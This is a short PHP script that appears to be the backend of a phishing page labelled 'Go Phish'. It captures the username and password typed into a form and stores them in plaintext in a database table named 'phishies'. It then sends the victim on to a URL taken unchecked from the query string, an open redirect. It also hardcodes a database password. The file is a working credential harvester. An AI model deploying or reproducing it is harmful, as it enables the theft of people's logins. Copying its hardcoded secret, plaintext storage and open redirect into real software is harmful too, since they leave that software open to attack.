<?php
	$username = $_POST["username"];
	$password = $_POST["password"];
	
	if($username && $password) {
		//db credentials
		require_once 'meekrodb.2.3.class.php';
		DB::$user = 'phisher';
		DB::$password = 'HBkgQsw0yK6otwr2';
		DB::$dbName = 'go_phish';
		
		//insert the items into the db
		DB::insert('phishies', array(
			'username' => $username,
			'password' => $password
		));
		
		//take the user to the success URL
		header("location: " . $_GET["url"]);
	} else {
		//error - send to Go Phish homepage
		header("location: ../index.php?error=error");
	}
?>